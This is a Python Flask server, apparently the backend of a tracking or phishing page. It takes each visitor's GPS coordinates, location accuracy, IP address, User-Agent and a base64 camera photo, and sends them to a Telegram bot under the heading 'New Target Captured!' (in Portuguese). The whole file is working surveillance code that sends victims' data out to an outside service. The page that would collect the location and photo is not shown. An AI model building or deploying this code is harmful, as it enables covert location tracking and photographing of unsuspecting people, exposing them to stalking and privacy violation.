from flask import Flask, render_template, request, jsonify
import requests
import os
import base64
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# Configurações do Telegram
TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("LOG_CHAT_ID")

def send_to_telegram(message, photo_data=None):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=payload)
    
    if photo_data:
        # Decodificar base64 e enviar como foto
        try:
            photo_bytes = base64.b64decode(photo_data.split(',')[1])
            files = {'photo': ('capture.jpg', photo_bytes, 'image/jpeg')}
            photo_url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
            requests.post(photo_url, data={'chat_id': CHAT_ID}, files=files)
        except Exception as e:
            print(f"Erro ao enviar foto: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/post', methods=['POST'])
def post_data():
    data = request.json
    lat = data.get('lat')
    lon = data.get('lon')
    acc = data.get('acc')
    ua = request.headers.get('User-Agent')
    ip = request.remote_addr
    photo = data.get('photo')

    msg = (
        f"🎯 **Novo Alvo Capturado!**\n"
        f"🌐 **IP:** `{ip}`\n"
        f"📱 **User-Agent:** `{ua}`\n"
        f"📍 **Localização:** https://www.google.com/maps/place/{lat},{lon}\n"
        f"📏 **Precisão:** {acc}m"
    )
    
    send_to_telegram(msg, photo_data=photo)
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
